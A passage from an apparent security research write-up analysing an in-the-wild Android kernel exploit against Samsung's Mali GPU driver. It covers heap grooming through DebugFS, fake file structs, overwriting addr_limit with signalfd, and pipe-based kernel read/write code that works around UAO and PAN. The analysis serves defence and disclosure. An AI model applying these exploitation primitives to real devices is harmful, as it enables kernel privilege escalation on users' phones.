"mem_profile_add: buffer too big\n");</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -EINVAL;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; buf = kmalloc(data-&gt;len, GFP_KERNEL);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (ZERO_OR_NULL_PTR(buf))</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -ENOMEM;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; err = copy_from_user(buf, u64_to_user_ptr(data-&gt;buffer),</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data-&gt;len);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (err) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kfree(buf);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -EFAULT;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; return kbasep_mem_profile_debugfs_insert(kctx, buf, data-&gt;len);</p><p dir="ltr">}</p><br></td></tr></tbody></table>

This ioctl takes a pointer to a buffer, the length of the buffer, and padding as arguments. kbase_api_mem_profile_add will allocate a buffer on the kernel heap and then will copy the passed buffer from userspace into the newly allocated kernel buffer.

Finally, kbase_api_mem_profile_add calls kbasep_mem_profile_debugfs_insert. This technique only works when the device is running a kernel with CONFIG_DEBUG_FS enabled. The purpose of the MEM_PROFILE_ADD ioctl is to write a buffer to DebugFS. As of Android 11, DebugFS should not be enabled on production devices. Whenever Android launches new requirements like this, it only applies to devices launched on that new version of Android. Android 11 launched in September 2020 and the exploit was found in November 2020 so it makes sense that the exploit targeted devices Android 10 and before where DebugFS would have been mounted.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYOnatV5Tbxu0n0Q5oP5HGHvZowemJC_GKvaFf-FAuwlNfx-m5AxwqWU0g5oMMejAoIUcCi10u7pE3n_uuhT3mmfE-7e74_B-ZifuKTmF44asidpw34Gg0jFNAMVKa2i9MsZ6MSGJrN2RayBa3kiPTBc-9JSqhk42W-wjV-IEAYhaQUiZ1hwiVmBpB/w640-h350/image4.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYOnatV5Tbxu0n0Q5oP5HGHvZowemJC_GKvaFf-FAuwlNfx-m5AxwqWU0g5oMMejAoIUcCi10u7pE3n_uuhT3mmfE-7e74_B-ZifuKTmF44asidpw34Gg0jFNAMVKa2i9MsZ6MSGJrN2RayBa3kiPTBc-9JSqhk42W-wjV-IEAYhaQUiZ1hwiVmBpB/s903/image4.png)

For example, on the A51 exynos device (SM-A515F) which launched on Android 10, both CONFIG_DEBUG_FS is enabled and DebugFS is mounted. 

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">a51:/ $ getprop ro.build.fingerprint</p><p dir="ltr">samsung/a51nnxx/a51:11/RP1A.200720.012/A515FXXU4DUB1:user/release-keys</p><p dir="ltr">a51:/ $ getprop ro.build.version.security_patch</p><p dir="ltr">2021-02-01</p><p dir="ltr">a51:/ $ uname -a</p><p dir="ltr">Linux localhost 4.14.113-20899478 #1 SMP PREEMPT Mon Feb 1 15:37:03 KST 2021 aarch64</p><p dir="ltr">a51:/ $ cat /proc/config.gz | gunzip | cat | grep CONFIG_DEBUG_FS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p dir="ltr">CONFIG_DEBUG_FS=y</p><p dir="ltr">a51:/ $ cat /proc/mounts | grep debug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p dir="ltr">/sys/kernel/debug /sys/kernel/debug debugfs rw,seclabel,relatime 0 0</p></td></tr></tbody></table>

Because DebugFS is mounted, the exploit is able to use the MEM_PROFILE_ADD ioctl to groom the heap. If DebugFS wasn’t enabled or mounted, kbasep_mem_profile_debugfs_insert would simply free the newly allocated kernel buffer and return.

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">#ifdef CONFIG_DEBUG_FS</p><p dir="ltr">int kbasep_mem_profile_debugfs_insert(struct kbase_context *kctx, char *data,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size_t size)</p><p dir="ltr">{</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; int err = 0;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; mutex_lock(&amp;kctx-&gt;mem_profile_lock);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; dev_dbg(kctx-&gt;kbdev-&gt;dev, "initialised: %d",</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kbase_ctx_flag(kctx, KCTX_MEM_PROFILE_INITIALIZED));</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (!kbase_ctx_flag(kctx, KCTX_MEM_PROFILE_INITIALIZED)) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (IS_ERR_OR_NULL(kctx-&gt;kctx_dentry)) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; err &nbsp;= -ENOMEM;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else if (!debugfs_create_file("mem_profile", 0444,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kctx-&gt;kctx_dentry, kctx,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &amp;kbasep_mem_profile_debugfs_fops)) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; err = -EAGAIN;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kbase_ctx_flag_set(kctx,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;KCTX_MEM_PROFILE_INITIALIZED);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (kbase_ctx_flag(kctx, KCTX_MEM_PROFILE_INITIALIZED)) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kfree(kctx-&gt;mem_profile_data);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kctx-&gt;mem_profile_data = data;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kctx-&gt;mem_profile_size = size;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; } else {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kfree(data);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; dev_dbg(kctx-&gt;kbdev-&gt;dev, "returning: %d, initialised: %d",</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; err, kbase_ctx_flag(kctx, KCTX_MEM_PROFILE_INITIALIZED));</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; mutex_unlock(&amp;kctx-&gt;mem_profile_lock);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; return err;</p><p dir="ltr">}</p><p dir="ltr">#else /* CONFIG_DEBUG_FS */</p><p dir="ltr">int kbasep_mem_profile_debugfs_insert(struct kbase_context *kctx, char *data,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size_t size)</p><p dir="ltr">{</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; kfree(data);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; return 0;</p><p dir="ltr">}</p><p dir="ltr">#endif /* CONFIG_DEBUG_FS */</p></td></tr></tbody></table>

By writing the fake file structs as a singular 0x2000 size buffer rather than as 25 individual 0x140 size buffers, the exploit will be writing their fake structs to two whole pages which increases the odds of reallocating over the freed file struct.

The exploit then calls dup2 on the dangling FD’s. The dup2 syscall will open another fd on the same open file structure that the original points to. In this case, the exploit is calling dup2 to verify that they successfully reallocated a fake file structure in the same place as the freed file structure. dup2 will increment the reference count (f_count) in the file structure. In all of our fake file structures, the f_count was set to 0x7F. So if any of them are incremented to 0x80, the exploit knows that it successfully reallocated over the freed file struct.

To determine if any of the file struct’s refcounts were incremented, the exploit iterates through each of the directories under /sys/kernel/debug/mali/mem/ and reads each directory’s mem_profile contents. If it finds the byte 0x80, then it knows that it successfully reallocated the freed struct and that the f_count of the fake file struct was incremented.

Overwriting the addr_limit
--------------------------

Like many previous Android exploits, to gain arbitrary kernel read and write, the exploit overwrites the kernel address limit (addr_limit). The addr_limit defines the address range that the kernel may access when dereferencing userspace pointers. For userspace threads, the addr_limit is usually USER_DS or 0x7FFFFFFFFF. For kernel threads, it’s usually KERNEL_DS or 0xFFFFFFFFFFFFFFFF.  

Userspace operations only access addresses below the addr_limit. Therefore, by raising the addr_limit by overwriting it, we will make kernel memory accessible to our unprivileged process. The exploit uses the syscall signalfd with the dangling fd to do this.

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">signalfd(dangling_fd, 0xFFFFFF8000000000, 8);</p></td></tr></tbody></table>

According to the [man pages](https://man7.org/linux/man-pages/man2/signalfd.2.html), the syscall signalfd is:

signalfd() creates a file descriptor that can be used to accept signals targeted at the caller.  This provides an alternative to the use of a signal handler or sigwaitinfo(2), and has the advantage that the file descriptor may be monitored by select(2), poll(2), and epoll(7).

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">int signalfd(int fd, const sigset_t *mask, int flags);</p></td></tr></tbody></table>

The exploit called signalfd on the file descriptor that was found to replace the freed one in the previous step. When signalfd is called on an existing file descriptor, only the mask is updated based on the mask passed as the argument, which gives the exploit an 8-byte write to the signmask of the signalfd_ctx struct.. 

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">typedef unsigned long sigset_t;</p><p dir="ltr">struct signalfd_ctx {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; sigset_t sigmask;</p><p dir="ltr">};</p></td></tr></tbody></table>

The file struct includes a field called private_data that is a void *. File structs for signalfd file descriptors store the pointer to the signalfd_ctx struct in the private_data field. As shown above, the signalfd_ctx struct is simply an 8 byte structure that contains the mask.

Let’s walk through how the signalfd source code updates the mask: 

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">SYSCALL_DEFINE4(signalfd4, int, ufd, sigset_t __user *, user_mask,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size_t, sizemask, int, flags)</p><p dir="ltr">{</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; sigset_t sigmask;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; struct signalfd_ctx *ctx;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; /* Check the SFD_* constants for consistency. &nbsp;*/</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; BUILD_BUG_ON(SFD_CLOEXEC != O_CLOEXEC);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; BUILD_BUG_ON(SFD_NONBLOCK != O_NONBLOCK);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (flags &amp; ~(SFD_CLOEXEC | SFD_NONBLOCK))</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -EINVAL;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (sizemask != sizeof(sigset_t) ||</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; copy_from_user(&amp;sigmask, user_mask, sizeof(sigmask)))</p><p dir="ltr">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -EINVAL;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; sigdelsetmask(&amp;sigmask, sigmask(SIGKILL) | sigmask(SIGSTOP));</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; signotset(&amp;sigmask);&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // [1]</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (ufd == -1) {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // [2]</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ctx = kmalloc(sizeof(*ctx), GFP_KERNEL);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (!ctx)</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -ENOMEM;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ctx-&gt;sigmask = sigmask;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /*</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* When we call this, the initialization must be complete, since</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* anon_inode_getfd() will install the fd.</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ufd = anon_inode_getfd("[signalfd]", &amp;signalfd_fops, ctx,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;O_RDWR | (flags &amp; (O_CLOEXEC | O_NONBLOCK)));</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (ufd &lt; 0)</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kfree(ctx);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; } else { &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // [3]</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; struct fd f = fdget(ufd);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (!f.file)</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -EBADF;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ctx = f.file-&gt;private_data;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // [4]</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (f.file-&gt;f_op != &amp;signalfd_fops) {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // [5]</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fdput(f);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -EINVAL;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; spin_lock_irq(&amp;current-&gt;sighand-&gt;siglock);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ctx-&gt;sigmask = sigmask; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // [6] WRITE!</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; spin_unlock_irq(&amp;current-&gt;sighand-&gt;siglock);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wake_up(&amp;current-&gt;sighand-&gt;signalfd_wqh);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fdput(f);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; return ufd;</p><p dir="ltr">}</p></td></tr></tbody></table>

First the function modifies the mask that was passed in. The mask passed into the function is the signals that should be accepted via the file descriptor, but the sigmask member of the signalfd struct represents the signals that should be blocked. The sigdelsetmask and signotset calls at [1] makes this change. The call to sigdelsetmask ensures that the SIG_KILL and SIG_STOP signals are always blocked so it clears bit 8 (SIG_KILL) and bit 18 (SIG_STOP) in order for them to be set in the next call. Then signotset flips each bit in the mask. The mask that is written is ~(mask_in_arg & 0xFFFFFFFFFFFBFEFF). 

The function checks whether or not the file descriptor passed in is -1 at [2]. In this exploit’s case it’s not so we fall into the else block at [3]. At [4] the signalfd_ctx* is set to the private_data pointer. 

The signalfd manual page also says that the fd argument “[must specify a valid existing signalfd file descriptor](https://man7.org/linux/man-pages/man2/signalfd.2.html#:~:text=If%20fd%20is%20not%20%2D1%2C%20then%20it%20must%20specify%20a%0A%20%20%20%20%20%20%20valid%20existing%20signalfd%20file%20descriptor)”. To verify this, at [5] the syscall checks if the underlying file’s f_op equals the signalfd_ops. This is why the f_op was set to signalfd_ops in the previous section. Finally at [6], the overwrite occurs. The user provided mask is written to the address in private_data. In the exploit’s case, the fake file struct’s private_data was set to the addr_limit pointer. So when the mask is written, we’re actually overwriting the addr_limit.

The exploit calls signalfd with a mask argument of 0xFFFFFF8000000000. So the value ~(0xFFFFFF8000000000 & 0xFFFFFFFFFFFCFEFF) = 0x7FFFFFFFFF, also known as USER_DS. We’ll talk about why they’re overwriting the addr_limit as USER_DS rather than KERNEL_DS in the next section. 

Working Around UAO and PAN
--------------------------

“User-Access Override” (UAO) and “Privileged Access Never” (PAN) are two exploit mitigations that are commonly found on modern Android devices. Their kernel configs are CONFIG_ARM64_UAO and CONFIG_ARM64_PAN. Both PAN and UAO are hardware mitigations released on ARMv8 CPUs. PAN protects against the kernel directly accessing user-space memory. UAO works with PAN by allowing unprivileged load and store instructions to act as privileged load and store instructions when the UAO bit is set.

It’s often said that the addr_limit overwrite technique detailed above doesn’t work on devices with UAO and PAN turned on. The commonly used addr_limit overwrite technique was to change the addr_limit to a very high address, like 0xFFFFFFFFFFFFFFFF (KERNEL_DS), and then use a pair of pipes for arbitrary kernel read and write. This is what Jann and I did in our [proof-of-concept for CVE-2019-2215](https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885#176) back in 2019. Our kernel_write function is shown below.

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">void kernel_write(unsigned long kaddr, void *buf, unsigned long len) {</p><p dir="ltr">&nbsp;&nbsp;errno = 0;</p><p dir="ltr">&nbsp;&nbsp;if (len &gt; 0x1000) errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);</p><p dir="ltr">&nbsp;&nbsp;if (write(kernel_rw_pipe[1], buf, len) != len) err(1, "kernel_write failed to load userspace buffer");</p><p dir="ltr">&nbsp;&nbsp;if (read(kernel_rw_pipe[0], (void*)kaddr, len) != len) err(1, "kernel_write failed to overwrite kernel memory");</p><p dir="ltr">}</p></td></tr></tbody></table>

This technique works by first writing the pointer to the buffer of the contents that you’d like written to one end of the pipe. By then calling a read and passing in the kernel address you’d like to write to, those contents are then written to that kernel memory address.

With UAO and PAN enabled, if the addr_limit is set to KERNEL_DS and we attempt to execute this function, the first write call will fail because buf is in user-space memory and PAN prevents the kernel from accessing user space memory.

Let’s say we didn’t set the addr_limit to KERNEL_DS (-1) and instead set it to -2, a high kernel address that’s not KERNEL_DS. PAN wouldn’t be enabled, but neither would UAO. Without UAO enabled, the unprivileged load and store instructions are not able to access the kernel memory.

The way the exploit works around the constraints of UAO and PAN is pretty straightforward: the exploit switches the addr_limit between USER_DS and KERNEL_DS based on whether it needs to access user space or kernel space memory. As shown in the uao_thread_switch function below, UAO is enabled when addr_limit == KERNEL_DS and is disabled when it does not.

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">/* Restore the UAO state depending on next's addr_limit */</p><p dir="ltr">void uao_thread_switch(struct task_struct *next)</p><p dir="ltr">{</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (IS_ENABLED(CONFIG_ARM64_UAO)) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (task_thread_info(next)-&gt;addr_limit == KERNEL_DS)</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; asm(ALTERNATIVE("nop", SET_PSTATE_UAO(1), ARM64_HAS_UAO));</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; asm(ALTERNATIVE("nop", SET_PSTATE_UAO(0), ARM64_HAS_UAO));</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">}</p></td></tr></tbody></table>

The exploit was able to use this technique of toggling the addr_limit between USER_DS and KERNEL_DS because they had such a good primitive from the use-after-free and could reliably and repeatedly write a new value to the addr_limit by calling signalfd. The exploit’s function to write to kernel addresses is shown below:

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">kernel_write(void *kaddr, const void *buf, unsigned long buf_len)</p><p dir="ltr">{</p><p dir="ltr">&nbsp;&nbsp;unsigned long USER_DS = 0x7FFFFFFFFF;</p><p dir="ltr">&nbsp;&nbsp;write(kernel_rw_pipe2, buf, buf_len); &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // [1]</p><p dir="ltr">&nbsp;&nbsp;write(kernel_rw_pipe2, &amp;USER_DS, 8u); &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // [2]</p><p dir="ltr">&nbsp;&nbsp;set_addr_limit_to_KERNEL_DS();&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // [3]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p dir="ltr">&nbsp;&nbsp;read(kernel_rw_pipe, kaddr, buf_len); &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // [4]</p><p dir="ltr">&nbsp;&nbsp;read(kernel_rw_pipe, addr_limit_ptr, 8u); &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // [5]</p><p dir="ltr">}</p></td></tr></tbody></table>

The function takes three arguments: the kernel address to write to (kaddr), a pointer to the buffer of contents to write (buf), and the length of the buffer (buf_len). buf is in userspace. When the kernel_write function is entered, the addr_limit is currently set to USER_DS. At [1] the exploit writes the buffer pointer to the pipe. A pointer to the USER_DS value is written to the pipe at [2].

The set_addr_limit_to_KERNEL_DS function at [3] sends a signal to tell another process in the exploit to call signalfd with a mask of 0. Because signalfd performs a NOT on the bits provided in the mask in signotset, the value 0xFFFFFFFFFFFFFFFF (KERNEL_DS) is written to the addr_limit. 

Now that the addr_limit is set to KERNEL_DS the exploit can access kernel memory. At [4], the exploit reads from the pipe, writing the contents to kaddr. Then at [5] the exploit returns addr_limit back to USER_DS by reading the value from the pipe that was written at [2] and writing it back to the addr_limit. The exploit’s function to read from kernel memory is the mirror image of this function.

I deliberately am not calling this a bypass because UAO and PAN are acting exactly as they were designed to act: preventing the kernel from accessing user-space memory. UAO and PAN were not developed to protect against arbitrary write access to the addr_limit. 

Post-exploitation
-----------------

